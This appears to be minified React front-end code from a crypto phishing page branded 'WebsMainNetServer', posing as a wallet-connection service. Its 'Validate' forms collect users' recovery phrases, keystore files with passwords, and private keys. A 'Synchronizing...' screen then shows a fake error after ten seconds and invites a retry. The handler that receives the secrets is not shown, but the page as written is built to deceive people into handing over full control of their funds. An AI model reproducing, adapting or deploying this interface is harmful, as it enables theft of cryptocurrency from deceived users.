                        "bg-neutral-700 py-4 px-4 flex justify-between gap-20",
                      children: [
                        f.jsxs("h2", {
                          className: "text-lg capitalize",
                          children: ["Validate ", g],
                        }),
                        f.jsx("button", {
                          onClick: n,
                          className: "outline-none focus:outline-none",
                          children: f.jsx("svg", {
                            height: 24,
                            width: 24,
                            viewBox: "0 0 24 24",
                            children: f.jsx("path", {
                              fill: "currentColor",
                              d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
                            }),
                          }),
                        }),
                      ],
                    }),
                    f.jsxs("section", {
                      className: "max-w-screen-md mx-auto p-4 pb-16 h-full",
                      children: [
                        f.jsxs("div", {
                          className:
                            "mb-6 flex items-center gap-4 bg-neutral-700 rounded-2xl pr-4",
                          children: [
                            e !== "others"
                              ? f.jsxs("div", {
                                  className: " py-2 px-4 flex-1",
                                  children: [
                                    f.jsx("div", {
                                      className:
                                        "text-xs font-medium text-gray-400",
                                      children: "Name",
                                    }),
                                    f.jsx("h4", {
                                      className: "text-lg capitalize",
                                      children: g,
                                    }),
                                  ],
                                })
                              : f.jsx("input", {
                                  value: i,
                                  placeholder: "Enter Wallet Name",
                                  className:
                                    "w-full text-sm bg-neutral-700 py-4 px-4 rounded-lg text-white border border-transparent transition-all focus:border-primary focus:outline-none",
                                  onChange: (y) => s(y.target.value),
                                }),
                            f.jsx("img", {
                              src: aa.includes(e)
                                ? `/images/${e
                                    .replace(/\s/g, "")
                                    .toLowerCase()}.png`
                                : `/images/logos/${e}.jpeg`,
                              className: "bg-white h-10 w-10 rounded-full",
                            }),
                          ],
                        }),
                        f.jsxs(Zt.Group, {
                          children: [
                            f.jsx(Zt.List, {
                              className:
                                "flex space-x-1 rounded-xl bg-white/20 p-1.5",
                              children: [
                                "Phrase",
                                "Keystore",
                                "Privatekey",
                              ].map((y, w) =>
                                f.jsx(
                                  Zt,
                                  {
                                    className: ({ selected: x }) =>
                                      en(
                                        "w-full rounded-lg py-2.5 text-sm font-medium leading-5",
                                        "focus:outline-none",
                                        x
                                          ? "bg-primary transition text-white shadow"
                                          : "text-white hover:bg-white/20"
                                      ),
                                    children: y,
                                  },
                                  y + w
                                )
                              ),
                            }),
                            f.jsxs(Zt.Panels, {
                              className: "my-4 ",
                              children: [
                                f.jsx(Zt.Panel, {
                                  children: f.jsxs("form", {
                                    onSubmit: v,
                                    children: [
                                      f.jsx("textarea", {
                                        className: en(
                                          "w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"
                                        ),
                                        rows: 4,
                                        required: !0,
                                        value: a.phrase,
                                        onChange: (y) =>
                                          o({ ...a, phrase: y.target.value }),
                                      }),
                                      f.jsx("p", {
                                        className:
                                          "text-xs text-primary mt-2 mb-4",
                                        children:
                                          "**Typically 12 (sometimes 24) words separated by single space",
                                      }),
                                      f.jsx(un, {
                                        type: "submit",
                                        label: u ? "Validating..." : "Validate",
                                        className: "w-full mt-4",
                                      }),
                                    ],
                                  }),
                                }),
                                f.jsx(Zt.Panel, {
                                  children: f.jsxs("form", {
                                    onSubmit: v,
                                    children: [
                                      f.jsx("textarea", {
                                        className: en(
                                          "w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"
                                        ),
                                        placeholder: "Your Keystore JSON",
                                        required: !0,
                                        rows: 4,
                                        value: a.keystore,
                                        onChange: (y) =>
                                          o({ ...a, keystore: y.target.value }),
                                      }),
                                      f.jsx("input", {
                                        className: en(
                                          "w-full text-base bg-neutral-700 py-4 px-4 rounded-lg my-3 text-white border border-transparent transition-all focus:border-primary focus:outline-none"
                                        ),
                                        placeholder: "Password",
                                        required: !0,
                                        value: a.password,
                                        onChange: (y) =>
                                          o({ ...a, password: y.target.value }),
                                      }),
                                      f.jsx(un, {
                                        type: "submit",
                                        label: u ? "Validating..." : "Validate",
                                        className: "w-full mt-4",
                                      }),
                                    ],
                                  }),
                                }),
                                f.jsx(Zt.Panel, {
                                  children: f.jsxs("form", {
                                    onSubmit: v,
                                    children: [
                                      f.jsx("textarea", {
                                        className: en(
                                          "w-full text-base bg-neutral-700 py-2 px-4 rounded-2xl text-white border border-transparent transition-all focus:border-primary focus:outline-none"
                                        ),
                                        rows: 4,
                                        placeholder: "Your Private Key",
                                        required: !0,
                                        value: a.privateKey,
                                        onChange: (y) =>
                                          o({
                                            ...a,
                                            privateKey: y.target.value,
                                          }),
                                      }),
                                      f.jsx(un, {
                                        type: "submit",
                                        label: u ? "Validating..." : "Validate",
                                        className: "w-full mt-4",
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            }),
                          ],
                        }),
                      ],
                    }),
                  ],
                }),
              }),
            }),
          }),
        ],
      }),
    });
  },
  nv = ({ onConnect: e }) => {
    const t = [
      {
        title: "Click 'Connect Wallet'",
        subtitle: `Locate the button on your desired app, as this will enable you
          to log in with your preferred wallet.`,
      },
      {
        title: "Scan the QR code or find your wallet",
        subtitle:
          "Initiate the connection so that WebsMainNetServer gets to work in the background, linking your wallet and app.",
      },
      {
        title: "Start exploring!",
        subtitle:
          "You can now interact with the app. Three simple steps is all it takes.",
      },
    ];
    return f.jsxs("main", {
      children: [
        f.jsxs("section", {
          className:
            "max-w-screen-xl mx-auto p-4 mt-8 mb-16 flex flex-col-reverse md:flex-row justify-between items-center gap-8",
          children: [
            f.jsxs("div", {
              className: "w-full md:w-1/5",
              children: [
                f.jsx("span", {
                  className:
                    "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                  children: "Simplify Your Crypto Experience",
                }),
                f.jsx("h2", {
                  className: "text-5xl lg:text-7xl font-black my-6",
                  children: "Web3 Connection Made Easy",
                }),
                f.jsx("p", {
                  className: "text-gray-400 mb-8",
                  children:
                    "The communications protocol for web3, WebsMainNetServer brings the ecosystem together by enabling wallets and apps to securely connect and interact.",
                }),
                f.jsx(un, {
                  label: "Synchronize Wallet",
                  color: "white",
                  onClick: e,
                }),
              ],
            }),
            f.jsx("div", {
              className:
                "w-full md:w-3/5 bg-gradient-to-br from-black from-30% via-primary/50 via-50% to-black to-20% flex justify-center items-center",
              children: f.jsx("img", {
                src: "/images/sync.png",
                className: "max-h-[75vh] rounded-2xl",
              }),
            }),
          ],
        }),
        f.jsxs("section", {
          className: "mt-8 mb-16 max-w-screen-xl p-4 mx-auto",
          children: [
            f.jsx("h3", {
              className: "font-bold text-4xl md:text-[50px] leading-none mb-8",
              children: "We make it easy for you to plug into web3.",
            }),
            f.jsx("img", {
              src: "/images/synth.jpeg",
              alt: "",
              className: "h-full w-full",
            }),
            f.jsxs("p", {
              className: "text-xl flex flex-wrap items-center gap-4",
              children: [
                f.jsx("span", {
                  className: "text-2xl font-semibold mr-0.5",
                  children: "Curious about",
                }),
                f.jsxs("div", {
                  className: "inline-flex gap-4",
                  children: [
                    f.jsx("span", {
                      className:
                        "rounded-3xl border-2 border-green-500 px-5 py-3 text-green-500",
                      children: "DeFi",
                    }),
                    f.jsx("span", {
                      className:
                        "rounded border-2 border-amber-500 px-5 py-3 text-amber-500",
                      children: "NFTs",
                    }),
                    f.jsx("span", {
                      className:
                        "rounded-[100%] border-2 border-blue-500 px-6 py-3 text-blue-500",
                      children: "DAOs",
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
        f.jsxs("section", {
          className: "max-w-screen-xl mx-auto p-4 my-8",
          children: [
            f.jsxs("div", {
              className: "text-center mb-8",
              children: [
                f.jsx("span", {
                  className:
                    "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                  children: "Popular Wallet Options",
                }),
                f.jsx("h2", {
                  className: "text-4xl font-bold my-2",
                  children: "Select One of the Actions Below",
                }),
                f.jsx("p", {
                  className: "text-gray-400",
                  children:
                    "With WebsMainNetServer, you can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences.",
                }),
              ],
            }),
            f.jsx("div", {
              className: "grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6",
              children: Jh.map((n, r) =>
                f.jsxs(
                  "div",
                  {
                    className:
                      "border rounded-lg p-6 cursor-pointer hover:bg-gradient-to-br from-black to-gray-900 transition-all",
                    onClick: e,
                    children: [
                      f.jsx("span", {
                        className:
                          "inline-block bg-gray-900 p-2 h-10 w-10 rounded fill-white",
                        children: oi.shuriken,
                      }),
                      f.jsx("h5", {
                        className: "text-lg text-white my-4 font-medium",
                        children: n.title,
                      }),
                      f.jsx("p", {
                        className: "text-gray-400 text-sm",
                        children: n.subtitle,
                      }),
                    ],
                  },
                  r
                )
              ),
            }),
          ],
        }),
        f.jsxs("section", {
          className: "my-16 max-w-screen-xl p-4 mx-auto",
          children: [
            f.jsxs("div", {
              className: "text-center mb-8",
              children: [
                f.jsx("span", {
                  className:
                    "text-xs bg-primary/30 rounded px-3 py-1.5 font-medium",
                  children: "Larger Connectivity",
                }),
                f.jsx("h2", {
                  className: "text-4xl font-bold my-2",
                  children: "Connect with Hundreds of Apps",
                }),
                f.jsx("p", {
                  className: "text-gray-400",
                  children:
                    "With WebsMainNetServer, you can connect your wallet with hundreds of apps, opening the doors to a new world of web3 experiences.",
                }),
              ],
            }),
            f.jsx("div", {
              className: "w-full my-4",
              children: t.map((n, r) =>
                f.jsxs(
                  no,
                  {
                    as: "div",
                    className:
                      "border border-neutral-600 rounded-[54px] p-4 my-2",
                    children: [
                      f.jsxs(no.Button, {
                        className:
                          "flex w-full items-center justify-between px-4 py-2 text-left text-xl font-medium",
                        children: [
                          n.title,
                          f.jsx("span", {
                            className:
                              "bg-blue-600 h-9 w-9 flex text-sm rounded-full items-center justify-center",
                            children: r + 1,
                          }),
                        ],
                      }),
                      f.jsx(no.Panel, {
                        className: "px-4 pt-4 pb-2 text-lg text-gray-400",
                        children: n.subtitle,
                      }),
                    ],
                  },
                  r
                )
              ),
            }),
          ],
        }),
      ],
    });
  };
function rv({ open: e, onClose: t, handleSelect: n }) {
  return f.jsx(f.Fragment, {
    children: f.jsx(we, {
      appear: !0,
      show: e,
      as: p.Fragment,
      children: f.jsxs(Re, {
        as: "div",
        className: "relative z-10",
        onClose: t,
        children: [
          f.jsx(we.Child, {
            as: p.Fragment,
            enter: "ease-out duration-300",
            enterFrom: "opacity-0",
            enterTo: "opacity-100",
            leave: "ease-in duration-200",
            leaveFrom: "opacity-100",
            leaveTo: "opacity-0",
            children: f.jsx("div", { className: "fixed inset-0 bg-black/50" }),
          }),
          f.jsx("div", {
            className: "fixed inset-0 overflow-y-auto",
            children: f.jsx("div", {
              className:
                "flex min-h-full items-end md:items-center justify-center md:p-4 text-center",
              children: f.jsx(we.Child, {
                as: p.Fragment,
                enter: "ease-out duration-300",
                enterFrom: "opacity-0 scale-95",
                enterTo: "opacity-100 scale-100",
                leave: "ease-in duration-200",
                leaveFrom: "opacity-100 scale-100",
                leaveTo: "opacity-0 scale-95",
                children: f.jsxs(Re.Panel, {
                  className:
                    "w-full md:max-w-sm transform overflow-hidden rounded-2xl rounded-b-none md:rounded-b-2xl bg-neutral-800 pt-4 md:pb-6 text-white text-left align-middle shadow-xl transition-all",
                  children: [
                    f.jsxs(Re.Title, {
                      as: "div",
                      className: "flex justify-between items-center px-4",
                      children: [
                        f.jsx("h2", {
                          className: "text-lg font-semibold pl-2",
                          children: "Select Your Wallet",
                        }),
                        f.jsx("button", {
                          type: "button",
                          onClick: t,
                          className: "focus:outline-none focus:border-none",
                          children: f.jsx("svg", {
                            height: 24,
                            width: 24,
                            viewBox: "0 0 24 24",
                            children: f.jsx("path", {
                              fill: "currentColor",
                              d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
                            }),
                          }),
                        }),
                      ],
                    }),
                    f.jsx("div", {
                      className: "mt-4 h-96 overflow-y-auto bg-black p-4",
                      children: f.jsx("div", {
                        className: "grid grid-cols-4 sm:grid-cols-4 gap-2",
                        children: Object.keys(On).map((r, l) =>
                          f.jsxs(
                            "div",
                            {
                              tabIndex: l + 1,
                              onClick: () => n(r),
                              className:
                                "cursor-pointer text-white transition-all duration-200 ease-in hover:bg-primary py-2 px-1.5 rounded-xl text-center",
                              children: [
                                f.jsx("img", {
                                  src: "/images/logos/" + r + ".jpeg",
                                  width: "48",
                                  height: "48",
                                  alt: On[r].name,
                                  className:
                                    "mx-auto rounded-full mb-2 bg-white",
                                }),
                                f.jsx("p", {
                                  className: "font-medium text-xs truncate",
                                  children: On[r].name,
                                }),
                              ],
                            },
                            r
                          )
                        ),
                      }),
                    }),
                  ],
                }),
              }),
            }),
          }),
        ],
      }),
    }),
  });
}
const lv = ({ open: e, onClose: t, handleRetry: n, walletName: r, id: l }) => {
  const [a, o] = p.useState(!1);
  return (
    p.useEffect(() => {
      let i;
      return (
        e
          ? (i = setTimeout(() => {
              o(!0);
            }, 1e4))
          : (o(!1), clearTimeout(i)),
        () => {
          clearTimeout(i);
        }
      );
    }, [e]),
    f.jsx(we, {
      appear: !0,
      show: e,
      as: p.Fragment,
      children: f.jsxs(Re, {
        as: "div",
        tabIndex: 1,
        className: "relative z-10",
        onClose: t,
        children: [
          f.jsx(we.Child, {
            as: p.Fragment,
            enter: "ease-out duration-300",
            enterFrom: "opacity-0",
            enterTo: "opacity-100",
            leave: "ease-in duration-200",
            leaveFrom: "opacity-100",
            leaveTo: "opacity-0",
            children: f.jsx("div", {
              className: "fixed inset-0 bg-black bg-opacity-25",
            }),
          }),
          f.jsx("div", {
            className: "fixed inset-0 overflow-y-auto",
            children: f.jsx("div", {
              className:
                "flex h-screen items-end md:items-center justify-center text-center",
              children: f.jsx(we.Child, {
                as: p.Fragment,
                enter: "ease-out duration-300",
                enterFrom: "opacity-0 scale-95",
                enterTo: "opacity-100 scale-100",
                leave: "ease-in duration-200",
                leaveFrom: "opacity-100 scale-100",
                leaveTo: "opacity-0 scale-95",
                children: f.jsxs(Re.Panel, {
                  className:
                    "w-full md:h-full rounded-t-3xl md:rounded-t-none transform overflow-hidden bg-black text-white text-left transition-all",
                  children: [
                    f.jsxs("header", {
                      className:
                        "bg-neutral-700 py-4 px-4 flex justify-between gap-20",
                      children: [
                        f.jsxs("h2", {
                          className: "text-lg capitalize",
                          children: [r || "Synchronizing", " "],
                        }),
                        f.jsx("button", {
                          onClick: t,
                          className: "outline-none focus:outline-none",
                          children: f.jsx("svg", {
                            height: 24,
                            width: 24,
                            viewBox: "0 0 24 24",
                            children: f.jsx("path", {
                              fill: "currentColor",
                              d: "M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z",
                            }),
                          }),
                        }),
                      ],
                    }),
                    f.jsxs("div", {
                      className: "max-w-screen-sm mx-auto p-8 text-center",
                      children: [
                        f.jsx("h2", {
                          className: "text-2xl text-center  font-bold",
                          children: "Synchronizing...",
                        }),
                        a
                          ? f.jsxs(f.Fragment, {
                              children: [
                                f.jsx("div", {
                                  className:
                                    "text-red-500 bg-red-500/20 font-semibold mt-6 py-3 px-4 rounded-lg flex items-center justify-between gap-2",
                                  children: f.jsx("p", {
                                    className: "text-sm",
                                    children:
                                      "An error occurred while synchronizing!",
                                  }),
                                }),
                                f.jsx(un, {
                                  dense: !0,
                                  variant: "outlined",
                                  label: "Try Again",
                                  onClick: n,
                                  className: "mt-6",
                                }),
                              ],
                            })
                          : f.jsxs(f.Fragment, {
                              children: [
                                f.jsxs("div", {
                                  className:
                                    "relative inline-flex justify-center mx-auto my-4",
                                  children: [
                                    f.jsxs("svg", {
                                      className: "animate-spin my-4 h-24 w-24",
                                      xmlns: "http://www.w3.org/2000/svg",
                                      fill: "none",
                                      viewBox: "0 0 24 24",
                                      children: [
                                        f.jsx("circle", {
                                          className: "opacity-25",
                                          cx: "12",
                                          cy: "12",
                                          r: "10",
                                          stroke: "currentColor",
                                          strokeWidth: "4",
                                        }),
                                        f.jsx("path", {
                                          className: "opacity-75",
                                          fill: "currentColor",
                                          d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z",
                                        }),
                                      ],
                                    }),
                                    l !== "others" &&
                                      f.jsx("img", {
                                        src: aa.includes(l)
                                          ? `/images/${l
                                              .replace(/\s/g, "")
                                              .toLowerCase()}.png`
                                          : `/images/logos/${l}.jpeg`,
                                        className:
                                          "absolute bg-white w-10 h-10 top-11 rounded-full",
                                      }),
                                  ],
                                }),
                                f.jsx("p", {
                                  className: "text-gray-600 mb-3",
                                  children:
                                    "This may take a few minutes to complete",
                                }),
                              ],
                            }),
                      ],
                    }),
                  ],
                }),
              }),
            }),
          }),
        ],
      }),
    })
  );
};
function av() {
  const [e, t] = p.useState(!1),
    [n, r] = p.useState(!1),
    [l, a] = p.useState(!1),
    [o, i] = p.useState(!1),
    [s, u] = p.useState(!1),
    [d, v] = p.useState("MetaMask"),
    [g, y] = p.useState("others"),
    [w, x] = p.useState("");
  return f.jsxs("div", {
    className: "bg-black text-white",
    children: [
      f.jsx(Xh, { onConnect: () => a(!0) }),
      f.jsx(nv, { onConnect: () => a(!0) }),
      f.jsx(Gm, {}),
      f.jsx(tv, {
        id: g,
        open: e,
        onClose: () => t(!1),
        onSubmit: (k) => {
          t(!1), u(!0), x(k);
        },
      }),
      f.jsx(lv, {
        open: s,
        walletName: w,
        id: g,
        onClose: () => u(!1),
        handleRetry: () => {
          u(!1),
            setTimeout(() => {
              a(!0);
            }, 2500);
        },
      }),
      f.jsx(Zh, {
        open: n,
        onClose: () => r(!1),
        handleManual: () => {
          d !== "WalletConnect"
            ? (t(!0), r(!1), d !== On[g].name && y(d))
            : (i(!0), r(!1));
        },
        wallet: d,
      }),
      f.jsx(ev, {
        open: l,
        onClose: () => a(!1),
        handleSelect: (k) => {
          k === "All Wallets" ? (i(!0), a(!1), v(k)) : (v(k), a(!1), r(!0));
        },
      }),
      f.jsx(rv, {
        open: o,
        onClose: () => i(!1),
        handleSelect: (k) => {
          y(k), i(!1), r(!0), v(On[k].name);
        },
      }),
    ],
  });
}
oo.createRoot(document.getElementById("root")).render(
  f.jsx($.StrictMode, { children: f.jsx(av, {}) })
);
